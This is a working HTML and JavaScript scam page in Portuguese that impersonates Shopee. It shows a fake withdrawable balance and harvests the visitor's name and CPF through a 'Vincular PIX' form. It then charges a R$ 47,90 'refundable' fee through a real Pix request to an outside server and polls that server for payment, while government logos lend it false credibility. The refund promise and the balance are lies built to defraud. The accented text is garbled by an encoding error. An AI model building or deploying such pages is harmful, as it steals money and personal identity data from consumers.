<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Resgate Shopee</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #e5e5e5; /* Fundo cinza s√≥lido, igual ao print */
            margin: 0; padding: 15px;
            color: #333;
            min-height: 100vh;
        }

        /* --- UTILIT√ÅRIOS --- */
        .hidden { display: none !important; }
        
        /* BOT√ÉO PADR√ÉO */
        .btn-main {
            background: #ee4d2d; color: white;
            width: 100%; padding: 15px;
            border: none; border-radius: 4px;
            font-size: 16px; font-weight: 500;
            cursor: pointer; text-transform: uppercase;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        .btn-disabled { background: #f0f0f0; color: #ccc; cursor: not-allowed; box-shadow: none; }

        /* --- TELA 1: SALDO --- */
        .top-card {
            background: #ee4d2d; /* Laranja S√≥lido Shopee */
            padding: 20px;
            border-radius: 8px;
            color: white;
            margin-bottom: 15px;
            position: relative;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        /* √çcone Sacola Shopee (CSS Puro) */
        .shopee-bag {
            position: absolute; top: 20px; right: 20px;
            width: 40px; height: 48px;
            background: #f0c419; /* Amarelo Ouro */
            border-radius: 4px;
            display: flex; align-items: center; justify-content: center;
        }
        .shopee-bag::before { /* Al√ßa da sacola */
            content: ''; position: absolute; top: -10px; left: 10px;
            width: 20px; height: 20px;
            border: 4px solid #f0c419;
            border-bottom: none; border-radius: 20px 20px 0 0;
        }
        .shopee-bag::after { /* Letra S */
            content: 'S'; color: #ee4d2d; font-weight: 900; font-size: 28px; font-family: sans-serif;
        }

        .header-top { font-size: 14px; margin-bottom: 5px; opacity: 0.95; }
        .saldo-valor { font-size: 38px; font-weight: 800; margin-bottom: 5px; }
        .pontos-text { font-size: 12px; opacity: 0.9; margin-bottom: 15px; }
        
        .divider { border-top: 1px dashed rgba(255,255,255,0.4); margin: 15px 0; }
        .bonus-text { font-size: 12px; font-weight: 500; }

        /* CARDS BRANCOS */
        .card-white {
            background: white;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 15px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
        }
        .card-title { font-size: 16px; font-weight: 700; color: #000; margin-bottom: 15px; }

        /* Op√ß√µes de Valor */
        .transfer-row { display: flex; align-items: center; font-size: 14px; color: #777; margin-bottom: 15px; }
        .pix-tag { 
            color: #32aba3; /* Cor "Teal" do Pix */
            font-weight: 700; font-size: 16px; margin-left: 5px; 
            font-family: sans-serif;
        }

        .option-group { display: flex; gap: 10px; margin-bottom: 10px; }
        .option-btn {
            background: #f5f5f5; border: 1px solid #f5f5f5;
            padding: 12px 0; border-radius: 4px;
            text-align: center; font-weight: 700; font-size: 14px;
            flex: 1; color: #333; cursor: pointer;
        }
        .big-option {
            width: 100%; padding: 20px 0;
            font-size: 24px; font-weight: 800;
            margin: 10px 0 20px 0;
            background: #f5f5f5; border: 1px solid #f5f5f5; border-radius: 4px;
            text-align: center; cursor: pointer;
        }
        /* Selecionado */
        .selected { border: 1px solid #ee4d2d !important; background: #fff !important; color: #ee4d2d !important; }

        /* Card de Texto (Rodap√©) */
        .footer-content { display: flex; gap: 15px; align-items: flex-start; }
        .footer-text { font-size: 11px; color: #666; line-height: 1.4; text-align: justify; }
        .footer-bag { width: 40px; opacity: 0.9; }

        /* --- TELA 2: MODAL VINCULAR --- */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); z-index: 99;
            display: flex; align-items: flex-end; justify-content: center;
        }
        .modal-sheet {
            background: white; width: 100%; max-width: 500px;
            border-radius: 16px 16px 0 0; padding: 25px;
            animation: slideUp 0.3s ease-out;
        }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }

        .input-group { margin-bottom: 15px; }
        .input-label { font-size: 13px; font-weight: 700; color: #333; margin-bottom: 8px; display: block; }
        .input-field {
            width: 100%; padding: 14px;
            border: 1px solid #ddd; border-radius: 6px;
            font-size: 15px; background: #fff;
        }

        /* --- TELA 3: CONFIRMA√á√ÉO --- */
        .shopee-top-bar { background: #ee4d2d; padding: 15px 0; display: flex; justify-content: center; }
        .summary-header { background: white; text-align: center; padding: 20px; border-bottom: 8px solid #f0f0f0; }
        .info-card { background: white; margin: 15px; border-radius: 8px; padding: 20px; border: 1px solid #eee; }
        .info-title { font-size: 12px; font-weight: 700; color: #666; text-transform: uppercase; margin-bottom: 10px; }
        .data-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f5f5f5; font-size: 13px; }
        .data-row:last-child { border-bottom: none; }
        
        .process-item { display: flex; gap: 12px; margin-bottom: 15px; }
        .p-icon { width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 12px; flex-shrink: 0; }
        .p-num { background: #fdeee9; color: #ee4d2d; }
        .p-check { background: #e8f5e9; color: #2e7d32; }
        
        .footer-logos { display: flex; justify-content: center; gap: 20px; align-items: center; margin: 30px 0 50px 0; filter: grayscale(100%); opacity: 0.6; }
        .logo-img { height: 20px; width: auto; }

        /* Popup QR Code */
        #qr-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 200; align-items: center; justify-content: center; }
        .qr-box { background: white; width: 90%; max-width: 320px; border-radius: 8px; padding: 25px; text-align: center; }
        .pix-code-area { background: #f5f5f5; border: 1px dashed #ccc; padding: 10px; font-size: 11px; word-break: break-all; margin: 15px 0; color: #555; border-radius: 4px; }
    </style>
</head>
<body>

    <div id="step-1">
        
        <div class="top-card">
            <div class="shopee-bag"></div> <div class="header-top">Seu saldo</div>
            <div class="saldo-valor">R$ 1.489,38</div>
            <div class="pontos-text">= 42.583,05 pontos (s)</div>
            
            <div class="divider"></div>
            <div class="bonus-text">√öltima bonifica√ß√£o apresentada : R$ 845,24</div>
        </div>

        <div class="card-white">
            <div class="card-title">Sacar dinheiro</div>
            
            <div class="transfer-row">
                <span style="font-size: 18px; margin-right: 5px;">üí≥</span> Transfer√™ncia via <span class="pix-tag">Pix</span>
            </div>

            <div class="option-group">
                <div class="option-btn" onclick="selectOption(this)">R$1,5</div>
                <div class="option-btn" onclick="selectOption(this)">R$5</div>
                <div class="option-btn" onclick="selectOption(this)">R$10</div>
            </div>

            <div id="big-opt" class="big-option" onclick="selectBigOption()">
                R$ 1.489,38
            </div>

            <button id="btn-sacar-1" class="btn-main btn-disabled" onclick="openStep2()">
                Sacar dinheiro
            </button>

            <p style="font-size:11px; color:#999; text-align:center; margin-top:15px; line-height:1.4;">
                Para sacar dinheiro, voc√™ precisa de um saldo m√≠nimo de R$1,5. Os limites de saque para transa√ß√µes individuais e mensais podem variar conforme o pa√≠s ou regi√£o.
            </p>
        </div>

        <div class="card-white">
            <div class="card-title" style="margin-bottom: 10px;">Obtenha seu acesso exclusivo</div>
            
            <div class="footer-content">
                <div class="footer-text">
                    Descubra todos os benef√≠cios liberados especialmente para voc√™. Ao concluir o acesso, voc√™ poder√° aproveitar as vantagens dispon√≠veis de forma r√°pida, segura e sem complica√ß√µes. N√£o perca a oportunidade de garantir algo que √© limitado e pensado para quem chegou at√© aqui.
                </div>
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" class="footer-bag">
            </div>
        </div>
    </div>


    <div id="step-2" class="modal-overlay hidden">
        <div class="modal-sheet">
            <h2 style="text-align:center; font-size:18px; margin-bottom:25px; color:#000;">Vincular PIX</h2>
            
            <div class="input-group">
                <label class="input-label">Nome Completo</label>
                <input type="text" id="input-nome" class="input-field" placeholder="Nome do titular">
            </div>

            <div class="input-group">
                <label class="input-label">Tipo de Chave PIX</label>
                <select class="input-field" style="background:white;"><option>CPF</option></select>
            </div>

            <div class="input-group">
                <label class="input-label">Chave PIX</label>
                <input type="tel" id="input-cpf" class="input-field" placeholder="Digite sua chave" maxlength="14" oninput="mask(this)">
            </div>

            <button class="btn-main" onclick="openStep3()">CONTINUAR</button>
            <p style="text-align:center; font-size:11px; color:#ccc; margin-top:20px;">Ambiente seguro Shopee Pay</p>
        </div>
    </div>


    <div id="step-3" class="hidden" style="background: #f5f5f5; min-height: 100vh;">
        <div class="shopee-top-bar">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" height="28" style="filter: brightness(0) invert(1);">
        </div>

        <div class="summary-header">
            <div style="font-size:12px; font-weight:700; color:#333; text-transform:uppercase;">SALDO DISPON√çVEL</div>
            <div style="font-size:32px; font-weight:800; color:#000; margin: 5px 0;">R$ 1.489,38</div>
            <div style="font-size:12px; color:#888;">Aguardando confirma√ß√£o para saque</div>
        </div>

        <div class="info-card">
            <div class="info-title">CONFIRMA√á√ÉO DE IDENTIDADE</div>
            <div style="display:flex; align-items:center; margin-bottom:10px; gap: 8px;">
                <span style="font-size:22px; font-weight:800; color:#ee4d2d;">R$ 47,90</span>
                <span style="background:#e8f5e9; color:#2e7d32; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:700;">VALOR REEMBOLS√ÅVEL</span>
            </div>
            <p style="font-size:13px; color:#555; line-height:1.4;">
                Taxa obrigat√≥ria para libera√ß√£o do b√¥nus. O valor de <strong>R$ 47,90</strong> ser√° reembolsado integralmente para voc√™ em 1 minuto.
            </p>
        </div>

        <div class="info-card">
            <div class="info-title">DADOS PARA REEMBOLSO</div>
            <div class="data-row"><span style="color:#888;">Nome</span><span id="display-nome" style="font-weight:600;">...</span></div>
            <div class="data-row"><span style="color:#888;">Data</span><span id="display-data" style="font-weight:600;">...</span></div>
            <div class="data-row"><span style="color:#888;">Chave PIX</span><span id="display-cpf" style="font-weight:600;">...</span></div>
            <div class="data-row"><span style="color:#888;">Valor a receber</span><span style="font-weight:700;">R$ 1.489,38</span></div>
        </div>

        <div class="info-card">
            <div class="info-title" style="margin-bottom:15px;">PROCESSO DE LIBERA√á√ÉO</div>
            <div class="process-item">
                <div class="p-icon p-num">1</div>
                <div><div style="font-weight:600; font-size:14px;">Pagar taxa de confirma√ß√£o</div><div style="font-size:12px; color:#888;">Verifica√ß√£o de identidade</div></div>
            </div>
            <div class="process-item">
                <div class="p-icon p-check">‚úì</div>
                <div><div style="font-weight:600; font-size:14px; color:#2e7d32;">Reembolso autom√°tico</div><div style="font-size:12px; color:#888;">Devolvido em 1 minuto</div></div>
            </div>
            <div class="process-item">
                <div class="p-icon" style="background:#eee; color:#aaa;">3</div>
                <div><div style="font-weight:600; font-size:14px;">Acessar saldo completo</div><div style="font-size:12px; color:#888;">R$ 1.489,38 liberado</div></div>
            </div>
        </div>

        <div style="padding: 10px 15px;">
            <button id="btn-final" class="btn-main" onclick="gerarPix()">Pagar taxa para Liberar Saque</button>
            <div style="text-align:center; font-size:12px; color:#2e7d32; font-weight:600; margin-top:10px;">‚è± Reembolso autom√°tico em 1 minuto</div>
        </div>

        <div class="footer-logos">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Banco_Central_do_Brasil_logo.svg/2560px-Banco_Central_do_Brasil_logo.svg.png" class="logo-img">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Gov.br_logo.svg" class="logo-img">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" class="logo-img">
        </div>
    </div>


    <div id="qr-modal">
        <div class="qr-box">
            <h3 style="margin-top:0;">Pagamento Pix</h3>
            <p style="font-size:13px; color:#666;">Copie o c√≥digo e pague no app do banco.</p>
            <img id="img-qr" style="width:160px; height:160px; display:block; margin:10px auto; border:1px solid #eee;">
            <div style="text-align:left; font-size:11px; font-weight:bold;">Pix Copia e Cola:</div>
            <textarea id="texto-pix" class="pix-code-area" readonly></textarea>
            <button class="btn-main" onclick="copiarCodigo()" style="padding:10px;">COPIAR C√ìDIGO</button>
            <div id="msg-sucesso" style="margin-top:15px; display:none; color:#2e7d32; font-weight:bold;">PAGAMENTO CONFIRMADO!</div>
        </div>
    </div>

    <script>
        const API_URL = "https://checkout-pix-profissional.onrender.com";
        let valorSelecionado = false;

        function mask(i){ let v=i.value.replace(/\D/g,""); v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"); i.value=v; }

        function selectOption(el) {
            document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
            document.getElementById('big-opt').classList.remove('selected');
            el.classList.add('selected');
            enableBtn1();
        }

        function selectBigOption() {
            document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
            document.getElementById('big-opt').classList.add('selected');
            enableBtn1();
        }

        function enableBtn1() {
            const btn = document.getElementById('btn-sacar-1');
            btn.classList.remove('btn-disabled');
            btn.innerText = "SACAR AGORA";
            valorSelecionado = true;
        }

        function openStep2() {
            if(!valorSelecionado) return alert("Selecione um valor.");
            document.getElementById('step-2').classList.remove('hidden');
        }

        function openStep3() {
            const nome = document.getElementById('input-nome').value;
            const cpf = document.getElementById('input-cpf').value;
            if(nome.length < 3 || cpf.length < 14) return alert("Preencha os dados.");

            document.getElementById('display-nome').innerText = nome;
            document.getElementById('display-cpf').innerText = cpf;
            document.getElementById('display-data').innerText = new Date().toLocaleDateString('pt-BR');

            document.getElementById('step-2').classList.add('hidden');
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-3').classList.remove('hidden');
            window.scrollTo(0,0);
        }

        async function gerarPix() {
            const btn = document.getElementById('btn-final');
            const nome = document.getElementById('input-nome').value;
            const cpf = document.getElementById('input-cpf').value.replace(/\D/g,'');

            btn.innerText = "GERANDO...";
            btn.classList.add('btn-disabled');

            try {
                const response = await fetch(`${API_URL}/pix`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ amount: 47.90, name: nome, cpf: cpf })
                });
                const data = await response.json();

                if (data.point_of_interaction) {
                    document.getElementById('img-qr').src = `data:image/png;base64,${data.point_of_interaction.transaction_data.qr_code_base64}`;
                    document.getElementById('texto-pix').value = data.point_of_interaction.transaction_data.qr_code;
                    document.getElementById('qr-modal').style.display = 'flex';
                    monitor(data.id);
                } else { throw new Error(); }
            } catch (error) {
                alert("Erro ao criar Pix.");
                btn.classList.remove('btn-disabled');
                btn.innerText = "Pagar taxa para Liberar Saque";
            }
        }

        function monitor(id) {
            const interval = setInterval(async () => {
                try {
                    const r = await fetch(`${API_URL}/pix/${id}`);
                    const j = await r.json();
                    if (j.status === 'approved') {
                        clearInterval(interval);
                        document.getElementById('msg-sucesso').style.display = 'block';
                        document.getElementById('img-qr').style.opacity = 0.3;
                    }
                } catch (e) {}
            }, 3000);
        }

        function copiarCodigo() {
            const texto = document.getElementById('texto-pix');
            texto.select();
            texto.setSelectionRange(0, 99999);
            document.execCommand('copy');
            alert("C√≥digo copiado!");
        }
    </script>
</body>
</html>